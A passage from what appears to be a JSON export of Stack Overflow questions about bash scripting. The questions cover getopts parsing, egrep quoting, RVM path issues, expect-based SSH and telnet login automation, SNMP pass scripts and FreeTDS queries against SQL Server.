processes:</p>\n\n<ol>\n<li>watching my folder for changes</li>\n<li>previewing my site in the browser</li>\n</ol>\n\n<p>I want to be able to run them and then later stop them both at the same time. I've seen everyone suggesting using the ampersand operator:</p>\n\n<pre><code>process_1 &amp; process_2\n</code></pre>\n\n<p>But pressing <code>Ctrl + C</code> only stops the second one. I have to <code>kill</code> the first one manually. What am I missing in this approach?</p>\n"},{"tags":["linux","bash","shell","command-line","getopts"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12846345,"title":"Is this the correct way to write opts","body":"<p>Is this the correct way to get and set with OPTS?</p>\n\n<p>I want to be able to take in a lot of options like</p>\n\n<p>./runthis.sh --option1 setuff --option2 setmorestuff</p>\n\n<pre><code>while :\ndo\n        case $1 in\n                -h | --help | -\\?)\n                        usage\n                        exit 0\n                        ;;\n                -o | --option1)\n                        O=$2\n                        shift 2\n                        ;;\n                -z | --option2)\n                        Z=$2\n                        shift 2\n                        ;;\n                --) # End of all options\n                        shift\n                        break\n                        ;;\n                -*)\n                        echo \"WARN: Unknown option (ignored): $1\" &gt;&amp;2\n                        shift\n                        ;;\n                *)  # no more options. Stop while loop\n                        break\n                        ;;\n        esac\ndone\n</code></pre>\n"},{"tags":["bash","sleep"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13131570,"title":"Run Bash Script for 6 Hours using Sleep","body":"<p>How do you use the sleep function to run the bash script every minute for say 6 hours?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","shell","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13126063,"title":"esacping single quotes while using egrep in shell script","body":"<p>I need to find  some special characters in a given input string .\nIf the string contains following special characters it should find out.\ni am doing  egrep to find the characters.\nMy code is working for every character but not single quotes.\nplease find my code snippet.</p>\n\n<pre><code>splCharCheck='egrep \"&amp;|\\\"|:|\\'\" | wc -l'\n\ncount=`echo  \"$Name\" | eval $splCharCheck`\n</code></pre>\n\n<p>Can any one help me how to escape single quotes here?</p>\n"},{"tags":["ruby-on-rails","linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13130836,"title":"Ruby On rails : need to run /bin/bash before any rails command","body":"<p>every time I log into the server, I cannot run any rails command until I run /bin/bash ; see below</p>\n\n<pre><code>Last login: Mon Oct 29 16:28:07 2012 from natint3.company.com\nuser1@company.com [~]# rails -v\n/usr/lib64/ruby/site_ruby/1.8/rubygems.rb:926:in `report_activate_error': Could not find RubyGem rails (&gt;= 0) (Gem::LoadError)\n    from /usr/lib64/ruby/site_ruby/1.8/rubygems.rb:244:in `activate_dep'\n    from /usr/lib64/ruby/site_ruby/1.8/rubygems.rb:236:in `activate'\n    from /usr/lib64/ruby/site_ruby/1.8/rubygems.rb:1307:in `gem'\n    from /usr/bin/rails:18\nuser1@company.com [~]# rvm info\n\nruby-1.9.3-p194:\n\nsystem:\nuname:       \"Linux box726.bluehost.com 2.6.32-20120131.55.1.bh6.x86_64 #1 SMP Tue Jan 31 15:43:27 EST 2012 x86_64 x86_64 x86_64 GNU/Linux\"\nsystem:      \"unknown/libc-2.12/x86_64\"\nbash:        \"/ramdisk/bin/bash =&gt; GNU bash, version 4.1.2(1)-release (x86_64-redhat-linux-gnu)\"\nzsh:         \"/usr/bin/zsh =&gt; zsh 4.3.10 (x86_64-redhat-linux-gnu)\"\n\nrvm:\nversion:      \"rvm 1.16.17 (stable) by Wayne E. Seguin &lt;wayneeseguin@gmail.com&gt;, Michal Papis &lt;mpapis@gmail.com&gt; [https://rvm.io/]\"\nupdated:      \"4 hours 10 minutes 5 seconds ago\"\n\nruby:\ninterpreter:  \"ruby\"\nversion:      \"1.9.3p194\"\ndate:         \"2012-04-20\"\nplatform:     \"x86_64-linux\"\npatchlevel:   \"2012-04-20 revision 35410\"\nfull_version: \"ruby 1.9.3p194 (2012-04-20 revision 35410) [x86_64-linux]\"\n\nhomes:\ngem:          \"/home3/user1/.rvm/gems/ruby-1.9.3-p194\"\nruby:         \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194\"\n\nbinaries:\nruby:         \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/ruby\"\nirb:          \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/irb\"\ngem:          \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/gem\"\nrake:         \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/rake\"\n\nenvironment:\nPATH:         \"/home3/user1/.rvm/gems/ruby-1.9.3-p194/bin:/home3/user1/.rvm/gems/ruby-1.9.3-p194@global/bin:/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin:/home3/user1/.rvm/bin:/usr/local/jdk/bin:/home3/user1/perl5/bin:/usr/lib64/qt-3.3/bin:/ramdisk/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11R6/bin:/home3/user1//ruby/gems/bin:/home3/user1//ruby/gems:/home3/user1/bin\"\nGEM_HOME:     \"/home3/user1/.rvm/gems/ruby-1.9.3-p194\"\nGEM_PATH:     \"/home3/user1/.rvm/gems/ruby-1.9.3-p194:/home3/user1/.rvm/gems/ruby-1.9.3-p194@global\"\nMY_RUBY_HOME: \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194\"\nIRBRC:        \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/.irbrc\"\nRUBYOPT:      \"\"\ngemset:       \"\"\n\n\nuser1@company.com [~]#\n</code></pre>\n\n<p>and after I run /bin/bash, I have a different behavior</p>\n\n<pre><code>user1@company.com [~]# /bin/bash\nuser1@company.com [~]# rails -v\nRails 3.2.8\nuser1@company.com [~]# rvm info\n\nRVM is not a function, selecting rubies with 'rvm use ...' will not work.\n\nYou need to change your terminal emulator preferences to allow login shell.\nSometimes it is required to use `/bin/bash --login` as the command.\nPlease visit https://rvm.io/integration/gnome-terminal/ for a example.\n\n\nsystem:\n\nsystem:\nuname:       \"Linux box726.bluehost.com 2.6.32-20120131.55.1.bh6.x86_64 #1 SMP Tue Jan 31 15:43:27 EST 2012 x86_64 x86_64 x86_64 GNU/Linux\"\nsystem:      \"unknown/libc-2.12/x86_64\"\nbash:        \"/ramdisk/bin/bash =&gt; GNU bash, version 4.1.2(1)-release (x86_64-redhat-linux-gnu)\"\nzsh:         \"/usr/bin/zsh =&gt; zsh 4.3.10 (x86_64-redhat-linux-gnu)\"\n\nrvm:\nversion:      \"rvm 1.16.17 (stable) by Wayne E. Seguin &lt;wayneeseguin@gmail.com&gt;, Michal Papis &lt;mpapis@gmail.com&gt; [https://rvm.io/]\"\nupdated:      \"4 hours 11 minutes 9 seconds ago\"\n\nhomes:\ngem:          \"/home3/user1//ruby/gems\"\nruby:         \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194\"\n\nbinaries:\nruby:         \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/ruby\"\nirb:          \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/irb\"\ngem:          \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/gem\"\nrake:         \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin/rake\"\n\nenvironment:\nPATH:         \"/usr/local/jdk/bin:/home3/user1/.rvm/gems/ruby-1.9.3-p194/bin:/home3/user1/.rvm/gems/ruby-1.9.3-p194@global/bin:/home3/user1/.rvm/rubies/ruby-1.9.3-p194/bin:/home3/user1/.rvm/bin:/home3/user1/perl5/bin:/usr/lib64/qt-3.3/bin:/ramdisk/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11R6/bin:/home3/user1//ruby/gems/bin:/home3/user1//ruby/gems:/home3/user1/bin\"\nGEM_HOME:     \"/home3/user1//ruby/gems\"\nGEM_PATH:     \"/home3/user1//ruby/gems:/usr/lib64/ruby/gems/1.8\"\nMY_RUBY_HOME: \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194\"\nIRBRC:        \"/home3/user1/.rvm/rubies/ruby-1.9.3-p194/.irbrc\"\nRUBYOPT:      \"\"\ngemset:       \"\"\n\n\nuser1@company.com [~]#\n</code></pre>\n\n<p>Anyone has an idea what's going on and how can I fix this issue?</p>\n\n<p>Thanks</p>\n\n<p>EDIT1</p>\n\n<p>Here are my .bashrc and .bash_profile file contents</p>\n\n<pre><code>user1@company.com [~]# cat ~/.bashrc\n# .bashrc\n\n# User specific aliases and functions\n\n# Source global definitions\nif [ -f /etc/bashrc ]; then\n    . /etc/bashrc\nfi\n\n    export HPATH=/home3/user1/\n    export GEM_HOME=$HPATH/ruby/gems\n    export GEM_PATH=$GEM_HOME:/usr/lib64/ruby/gems/1.8\n    export GEM_CACHE=$GEM_HOME/cache\n    export PATH=$PATH:$HPATH/ruby/gems/bin\n    export PATH=$PATH:$HPATH/ruby/gems  \n\nPATH=$PATH:/home3/user1/.rvm/bin # Add RVM to PATH for scripting\n\nPATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting\nuser1@company.com [~]# cat ~/.bash_profile \n# .bash_profile\n\n# Get the aliases and functions\nif [ -f ~/.bashrc ]; then\n    . ~/.bashrc\nfi\n\n# User specific environment and startup programs\n\nPATH=$PATH:$HOME/bin\n\nexport PATH\nunset USERNAME\n\n\n[[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; source \"$HOME/.rvm/scripts/rvm\" # Load RVM into a shell session *as a function*\nuser1@company.com [~]#\n</code></pre>\n"},{"tags":["bash","autocomplete","bash-completion"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13128011,"title":"bash completion of built-in commands","body":"<p>Where are the completion scripts for commands such as <code>cd</code> and <code>ls</code> and other built-in bash commands?</p>\n\n<p>I looked in <code>/etc/bash_completion.d/</code> but they are not there.</p>\n"},{"tags":["linux","file","bash","permissions","folder"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13131044,"title":"How to output the non-readable contents of a directory in bash","body":"<p>In bash how would one output the non-readable contents of a directory?</p>\n\n<p>For example, let's say the directory is <code>~/foo</code>, and there's a non-readable folder <code>~/foo/folder</code> with a file <code>~/foo/folder/file1.txt</code>, and another non-readable file <code>~/foo/file2.txt</code>. I want to output:</p>\n\n<pre><code>~/foo/folder cannot be read.\n~/foo/folder/file1.txt cannot be read.\n~/foo/file2.txt cannot be read.\n</code></pre>\n"},{"tags":["bash","command-line","spring-security","saltedhash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13130949,"title":"Spring security generate a salted hash for users from command line","body":"<p>How do you generate a salted hash for users in spring security 3x from a bash command line?</p>\n"},{"tags":["bash","shell","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13084885,"title":"Check if at least one file exists in bash","body":"<p>I have this</p>\n\n<pre><code>if [[ -e file.jpg ]] ;then echo \"aaaaaaaaa\"; fi\n</code></pre>\n\n<p>and it prints \"aaaaaaa\"</p>\n\n<p>but I want to print if there is file.png or file.png also</p>\n\n<p>so I need something like this</p>\n\n<pre><code>if [[ -e file.* ]] ;then echo \"aaaaaaaaa\"; fi\n</code></pre>\n\n<p>but it doesn't work I am missing something in the syntax</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":13127950,"title":"Bash script. Iterate through all ASCII chars","body":"<p>I know how to iterate through characters </p>\n\n<pre><code>for c in {a..z}\n</code></pre>\n\n<p>But I can't figure out, how to iterate through all ASCII chars.\nI'm sure, it should be really easy.</p>\n"},{"tags":["linux","bash","scripting"],"answer_count":7,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":3888,"score":4,"question_id":8967902,"title":"Why do you need to put #!/bin/bash at the beginning of a script file?","body":"<p>I have made bash scripts before and they all ran fine without this at the beginning. What's the point of putting it in? Would things be any different?</p>\n\n<p>Also, how do you pronounce #? I know that ! is pronounced as \"bang.\"</p>\n\n<p>Edit: How is <code>#!</code> pronounced?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13128314,"title":"bash - execution shortcut","body":"<p>I want to execute foo.bsh typing only foo.bsh or even foo instead of ./foo.bsh. I would like to do this temporarily for all .bsh in a directory, as well as globally. For example I want to have a global Key MYIP which calls a script to echo my external IP. I don't know if this make sense, because I could crash my bash if I overwrite echo.</p>\n\n<p>Edit: to be more clear. I want a shortcut for writing \"./\" saving me 2 keys for those commands, such as in DOS where foo.exe can be executed with foo. Couldn't bash look in the current directory for .bsh files, if I type foo (ENTER) ?</p>\n"},{"tags":["bash","script","snmp","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":116,"score":2,"question_id":12902649,"title":"Expect script to simulate SNMP","body":"<p>I want to monitor a device that doesn´t support SNMP, so I have tried get a counter via an expect script. This script connects to the device using SSH, logs the output on a file and then it parses the output in order to get the desired counter.</p>\n\n<p>When I execute the script from the console I get the following desired output:</p>\n\n<pre><code>root@box:/path# ./GGSN-PDP-Contexts.expect  \n.1.3.6.1.4.1.6147.2.1  \nInteger32  \n310838  \n</code></pre>\n\n<p>However, when I try to get the result using snmpget it doesn´t work!</p>\n\n<pre><code>root@box:/path# snmpget -m TDP-MIB  -v 2c -c TM_Com_Pub localhost .1.3.6.1.4.1.6147.2.1  \nTDP-MIB::PDPContextsNumber = No Such Instance currently exists at this OID  \n</code></pre>\n\n<p>By the way, this is the relevant configuration at snmpd.conf:<br>\n    pass .1.3.6.1.4.1.6147.2.1 /usr/bin/expect /path/GGSN-PDP-Contexts.expect  </p>\n\n<p>And this is the expect script that I'm using:  </p>\n\n<pre><code>#!/usr/bin/expect -f  \n\n# Constants  \nset user \"user\"  \nset device \"10.10.222.176\"  \nset pass \"blablabla\"  \nset timeout -1  \nset prompt \"GGSN-LV02#\"  \nset file \"./GGSN-PDP-Contexts.log\"  \n\n# Options  \nmatch_max 100000  \nlog_user 0  \n\n# Access to device  \nspawn ssh -oStrictHostKeyChecking=no -oCheckHostIP=no $user@$device  \nexpect \"*?assword:*\"  \nsend -- \"$pass\\r\"  \n\n# Commands execution  \nexpect -exact \"$prompt\"  \nsend -- \"display pdp-number\\r\"  \nlog_file -a $file\n\n# Logging  \nexpect -exact \"$prompt\"  \nlog_file  \nsend -- \"quit\\r\"  \n\n# Get the value  \nset result [exec cat $file | grep \"ALL GTP\" | cut -d \" \" -f14]  \nset value [format %d $result]  \n\n# Print the value  \nputs \".1.3.6.1.4.1.6147.2.1\"  \nputs \"Integer32\"  \nputs $value  # If I replace the $value with a number, it doesn't work either  \n\n# Erase log file  \nexec rm $file  \nclose  \n</code></pre>\n\n<p>Could you bring me any hint? Thanks in advance!</p>\n\n<p><b> EDIT: </b></p>\n\n<p>In addition, these are the last lines of snmpget's debug output:</p>\n\n<pre><code>trace: snmp_comstr_parse(): snmp_auth.c, 135:  \ndumph_recv:   SNMP version  \ndumpx_recv:    02 01 01 \ndumpv_recv:      Integer:       1 (0x01)  \ntrace: snmp_comstr_parse(): snmp_auth.c, 147:  \ndumph_recv:   community string  \ndumpx_recv:    04 0A 54 4D 5F 43 6F 6D 5F 50 75 62   \ndumpv_recv:      String:        TM_Com_Pub  \ntrace: _snmp_parse(): snmp_api.c, 4149:  \ndumph_recv:   PDU  \ntrace: snmp_pdu_parse(): snmp_api.c, 4255:  \ndumpv_recv:     Command RESPONSE  \ntrace: snmp_pdu_parse(): snmp_api.c, 4336:  \ndumph_recv:     request_id  \ndumpx_recv:      02 04 3B 9E CF 74   \ndumpv_recv:        Integer:     1000263540 (0x3B9ECF74)  \ntrace: snmp_pdu_parse(): snmp_api.c, 4347:  \ndumph_recv:     error status  \ndumpx_recv:      02 01 00   \ndumpv_recv:        Integer:     0 (0x00)  \ntrace: snmp_pdu_parse(): snmp_api.c, 4358:  \ndumph_recv:     error index  \ndumpx_recv:      02 01 00   \ndumpv_recv:        Integer:     0 (0x00)  \ntrace: snmp_pdu_parse(): snmp_api.c, 4376:  \ndumph_recv:     VarBindList  \ntrace: snmp_pdu_parse(): snmp_api.c, 4406:  \ndumph_recv:       VarBind  \ntrace: snmp_parse_var_op(): snmp.c, 166:  \ndumph_recv:         Name  \ndumpx_recv:          06 09 2B 06 01 04 01 B0 03 02 01   \ndumpv_recv:            ObjID: TDP-MIB::PDPContextsNumber  \ntrace: snmp_pdu_parse(): snmp_api.c, 4415:  \ndumph_recv:         Value  \nTDP-MIB::PDPContextsNumber = No Such Instance currently exists at this OID  \n</code></pre>\n\n<p>Also, this is my current MIB:  </p>\n\n<pre><code>TDP-MIB DEFINITIONS ::= BEGIN  \n\nIMPORTS  \n    MODULE-IDENTITY, OBJECT-TYPE, Integer32, enterprises  \n                    FROM SNMPv2-SMI  \n    OBJECT-GROUP    FROM SNMPv2-CONF;   \n\nTDP MODULE-IDENTITY  \n    LAST-UPDATED \"201210080000Z\" -- 8/oct/2012  \n    ORGANIZATION    \"TELEFONICA\"  \n    CONTACT-INFO    \"Authors: Hernan Romano / Antonio Ocampo  \n                     Email: h.romanoc@pucp.edu.pe / aocampo@pucp.edu.pe\"  \n    DESCRIPTION     \"MIB para gestionar los equipos que carecen de SNMP\"  \n    REVISION        \"201210080000Z\" -- 08/oct/2012  \n    DESCRIPTION     \"Revision 2.1\"  \n    ::= { enterprises 6147 }    \n\nNokia                   OBJECT IDENTIFIER ::= { TDP 1 }  \nHuawei                  OBJECT IDENTIFIER ::= { TDP 2 }  \nTDPMIBConformance       OBJECT IDENTIFIER ::= { TDP 3 }  \n\nClearCodeGroup1         OBJECT-TYPE  \n                        SYNTAX Integer32  \n                        MAX-ACCESS read-only  \n                        STATUS current  \n                        DESCRIPTION \"Clear Code Group 1\"  \n                        ::= { Nokia 1 }  \n\nPDPContextsNumber       OBJECT-TYPE  \n                        SYNTAX Integer32  \n                        MAX-ACCESS read-only  \n                        STATUS current  \n                        DESCRIPTION \"PDP Contexts Number\"  \n                        ::= { Huawei 1 }  \n\nTDPMIBGroup             OBJECT IDENTIFIER  \n                        ::= { TDPMIBConformance 1 }  \n\n--grupoTDP      OBJECT-GROUP  \n--      OBJECTS {  \n--              ClearCodeGroup1,  \n--              PDPContextsNumber  \n--      }  \n--      STATUS current  \n--      DESCRIPTION \"Objetos para el monitoreo de los equipos que carecen de SNMP\"  \n--      ::= { TDPMIBGroup 1 }  \nEND  \n</code></pre>\n"},{"tags":["linux","bash","command-line","freetds","sqsh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13124785,"title":"What is the advantage of using Sqsh with FreeTDS?","body":"<p>newbie question here: I have FreeTDS working and querying a Microsoft SQL server 2008 r2 db, from a mint linux vm, reading the inter-webs, mostly stackoverflow, it is mentioned that I should use sqsh also with FreeTDS,  <a href=\"http://stackoverflow.com/questions/149395/what-are-some-ways-of-accessing-microsoft-sql-server-from-linux\">SQSH &amp; FreeTDS</a>, I don't understand what sqsh, besides being sometype of cli I guess, adds as I can use FreeTDS to access the db..  Any info to clear this up would be appreciated.</p>\n"},{"tags":["bash","if-statement","trap"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13103701,"title":"how to trap errors inside the if statement","body":"<p>Running the following code:</p>\n\n<pre><code>#!/bin/bash\n\nset -o pipefail\nset -o errtrace\nset -o nounset\nset -o errexit\n\nfunction err_handler ()\n{\n    local error_code=\"$?\"\n    echo \"TRAP!\"\n    echo \"error code: $error_code\"\n    exit\n}\ntrap err_handler ERR\n\necho \"wrong command in if statement\"\n\nif xsxsxsxs \n    then\n        echo \"if result is true\"\n    else\n        echo \"if result is false\"\nfi\n\necho -e \"\\nwrong command directly\"\nxsxsxsxs \n\nexit\n</code></pre>\n\n<p><br>\nproduces the following output:</p>\n\n<pre><code>wrong command in if statement\ntrap.sh: line 21: xsxsxsxs: command not found\nif result is false\n\nwrong command directly\ntrap.sh: line 29: xsxsxsxs: command not found\nTRAP!\nerror code: 127\n</code></pre>\n\n<p><br>\nHow can I trap the '<em>command not found</em>' error inside the if statement too?</p>\n"},{"tags":["bash","if-statement","boolean","condition"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":190,"score":1,"question_id":8002573,"title":"Bash always printing same value regardless of boolean value","body":"<p>Related to <a href=\"http://stackoverflow.com/questions/8002083/1-command-not-found/8002330#8002330\">SO</a>.</p>\n\n<p>fizzy.sh:</p>\n\n<pre><code>#!/usr/bin/env sh\n\ndiv3() {\n    expr $1 % 3 = 0\n}\n\ndiv5() {\n    expr $1 % 5 = 0\n}\n\nfizzy() {\n    if [ $(div3 $1) ] &amp;&amp; [ $(div5 $1) ]; then\n        expr \"FizzBuzz\"\n    elif [ $(div3 $1) ]; then\n        expr \"Fizz\"\n    elif [ $(div5 $1) ]; then\n        expr \"Buzz\"\n    else\n        expr \"$1\"\n    fi\n}\n\necho $(fizzy 1)\necho $(fizzy 2)\necho $(fizzy 3)\n</code></pre>\n\n<p>Example:</p>\n\n<pre><code>$ ./fizzy.sh\nFizzBuzz\nFizzBuzz\nFizzBuzz\n</code></pre>\n"},{"tags":["linux","bash","shell","pwd","getcwd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12338233,"title":"shell init issue when click tab, what's wrong with getcwd?","body":"<p>once i click Tab on bash, the error message will appear, what's wrong?</p>\n\n<pre><code>symlink-hook: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: Success\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: Success\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: Success\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: Success\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: Success\nsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: Success\n</code></pre>\n\n<p>sometimes, the error message is:</p>\n\n<pre><code>shell-init: error retrieving current directory: getcwd: cannot access parent directories: No s uch file or directory\n</code></pre>\n\n<p>how to solve shell init problem?</p>\n"},{"tags":["bash","tcl","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13084870,"title":"Making decisions on expect return","body":"<p>I am trying to create an expect script which will send a different password string based on the \"expect\"</p>\n\n<ul>\n<li><p>Condition A: If a cisco device has not been setup with a username then the first prompt will simply be \"Password:\" - then it should use passwordA (no username)</p></li>\n<li><p>Condition B: If it has been setup with a username then the prompt will be \"Username:\" followed by \"Password:\" - then it should use Username and PasswordB</p></li>\n</ul>\n\n<p></p>\n\n<pre><code>#!/bin/bash\n# Declare host variable as the input variable\nhost=$1　\n # Start the expect script\n(expect -c \"\nset timeout 20\n# Start the session with the input variable and the rest of the hostname\nspawn telnet $host\nset timeout 3 \nif {expect \\\"Password:\\\"} {\nsend \\\"PasswordA\\\"}\nelseif { expect \\\"Username:\\\"}\nsend \\\"UsersName\\r\\\"}\nexpect \\\"Password:\\\"\nlog_user 0 \nsend \\\"PasswordB\\r\\\"\nlog_user 1\nexpect \\\"*&gt;\\\"\n# send \\\"show version\\r\\\"\n# set results $expect_out(buffer) \n#expect \\\"Password:\\\"\n#send \\\"SomeEnablePassword\\r\\\"\n# Allow us to interact with the switch ourselves\n# stop the expect script once the telnet session is closed\nsend \\\"quit\\r\\\"\nexpect eof\n\")\n</code></pre>\n"},{"tags":["linux","tsql","bash","shell","freetds"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13096018,"title":"freeTDS bash: Executing sql queries in Microsoft SQL server","body":"<p>I am able to connect to a Microsoft SQL Server 2008 instance via a Mint Linux VM using freeTSD and command line to execute sql statements on it. Now I want automate this in a bash script. I am able to successfully login in my bash script:</p>\n\n<pre><code>TDSVER=8.0 tsql -H servername -p 1433 -D dbadmin -U domain\\\\Administrator -P password\n</code></pre>\n\n<p>I then have my SQL query:</p>\n\n<pre><code>USE dbname GO delete from schema.tableA where ID &gt; 5 GO delete from schema.tableB where ID &gt; 5 GO delete from schema.tableC where ID &gt; 5 GO exit\n</code></pre>\n\n<p>This works when doing manually via freeTSD command line, but not when I put in bash file. I followed this post: <a href=\"http://stackoverflow.com/questions/5445374/bash-script-makes-connection-using-freetds-interacts-doesnt-exit-just-hangs\">freeTSD &amp; bash</a>.</p>\n\n<p>Here is my bash script sample:</p>\n\n<pre><code>echo \"USE dbname GO delete from schema.tableA where userid &gt; 5 go delete from schema.tableB where userid &gt; 5 go delete from schema.tableC where ID &gt; 5 GO exit\" &gt; tempfile | TDSVER=8.0 tsql -H servername -p 1433 -D dbname -U domain\\\\Administrator -P password &lt; tempfile\n</code></pre>\n\n<p>the output of the bash script is:</p>\n\n<pre><code>locale is \"en_US.UTF-8\"\nlocale charset is \"UTF-8\"\nDefault database being set to dbname\n1&gt; 2&gt; \n</code></pre>\n\n<p>and then the rest of my script is executed.</p>\n\n<p>Can someone give me a step by step answer to my problem ?</p>\n"},{"tags":["regex","bash","grep","base64"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13124223,"title":"Ignoring base64 encoded attahments when grepping through .eml files","body":"<p>I've got a huge pile of exported emails in .eml format that I'm grepping through for keywords with something like this:</p>\n\n<pre><code>egrep -iR \"keyword|list|foo|bar\" *\n</code></pre>\n\n<p>This results in a number of false positives when using relatively short keywords due to base64 encoded email attachments like this:</p>\n\n<pre><code>Inbox/Email Subject.eml:rcX2aiCZBfoogjNUShcWC64U7buTJE3rC5CeShpo/Uhz0SeGz290rljsr6woPNt3DQ0iFGzixrdj\nInbox/Email Subject.eml:3qHXNEj5sKXUa3LxfkmEAEWOpW301Pbarq2Jr2IswluaeKqCgeHIEFmFQLeY4HIcTBe3wCf6HzPL\n</code></pre>\n\n<p>Is there a regex I can write that will identify and exclude these matches, or can I tell grep to stop reading a file once it gets to a line that says \"Content-Transfer-Encoding: base64\"?</p>\n"},{"tags":["bash","tcsh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13082038,"title":"execute tcsh command in bash script","body":"<p>In a bash script I need to execute this tcsh command. This command works fine in a tcsh command prompt but not in my bash script.</p>\n\n<pre><code>eval `/app/modules/0/bin/modulecmd tcsh $variable`\n</code></pre>\n\n<p>I have tried several things like adding</p>\n\n<pre><code>/usr/bin/tcsh -c eval `/app/modules/0/bin/modulecmd tcsh $variable`\n</code></pre>\n\n<p>but then it says: No such file or directory.</p>\n\n<p>Edit: current code:</p>\n\n<pre><code># hook for some commands\n\necho 'To be sure the version that are loading exist for your platform plase use: \"module aplikation load/version\" instead of \"module load application\". A check will then be done.'\ncmd=$(basename \"$0\") # it givs error here if i start with: tcsh -v xmodule load firefox/3.6.13     \nvar1=$(echo \"$@\" | awk '{print $2}' | cut -f1 -d\"/\") # Gets the application name and put it into var1\nvar2=$(echo \"$@\" | grep -o '[^/]*$')  # Gets version name and put it into var2 \n\nif [[ $cmd = \"xmodule\" ]]\n        then\n#First if statement: checking if a spesific version of an apllication is requested.\n        if  [[ ${@} =~ .*/.* &amp;&amp; ${@} =~ ((^)|([ ]))load(($)|([ ])) ]]\n        then\n           if find /app/$var1 -noleaf -maxdepth 1 -type l -o -type d | grep $var2; then #matching version to symlink or dir in /app/appname/\n           echo \"$@\"\n           tcsh -c 'eval `/app/modules/0/bin/modulecmd tcsh $@`'  #execute the module command as normal if version exist\n           exit $?\n        else\n           echo \"Could not find $var1 or $var2, one of these things happend:\"\n           echo \"$var1 was misspelled\"\n           echo \"$var2 was misspelled\"\n           echo \"version does exist as a module but not for your platform (see module avail $var1). Printing a list of suported versions:\"\n                ls /app/$var1/\n           echo \"exiting: please rety again\"\n           exit $?\n        fi\nfi\n# Next check. Checking if default module version is loaded\nfi\nexit\n</code></pre>\n\n<p>EDIT again:</p>\n\n<p>Environmental variables are actually set, but not for the user who runs the script</p>\n\n<blockquote>\n  <ul>\n  <li>/app/modules/0/bin/modulecmd tcsh load gcc/4.3.4\n  setenv LD_LIBRARY_PATH '/app/mpfr/2.4.0/lib:/app/gmp/4.2.4/lib:/usr/lib64/mpi/gcc/openmpi/lib64';setenv LD_RUN_PATH '/app/mpfr/2.4.0/lib:/app/gmp/4.2.4/lib:/app/gcc/4.3.4/lib64:/app/gcc/4.3.4/lib';setenv MANPATH '/app/gcc/4.3.4/man:/app/emacs/23.2/LMWP3/share/man:/app/vim/7.3.021/LMWP3/share/man:/app/xemacs/21.5.29/LMWP3/share/man:/app/j2re/1.6.0_22/LMWP3/man:/usr/lib64/mpi/gcc/openmpi/man:/usr/share/man:/opt/quest/man:/usr/local/man:/usr/man:/opt/lsb/man:/opt/mpich/man:/opt/gnome/share/man:/app/modules/0/man:/app/modules/0/man';setenv PATH 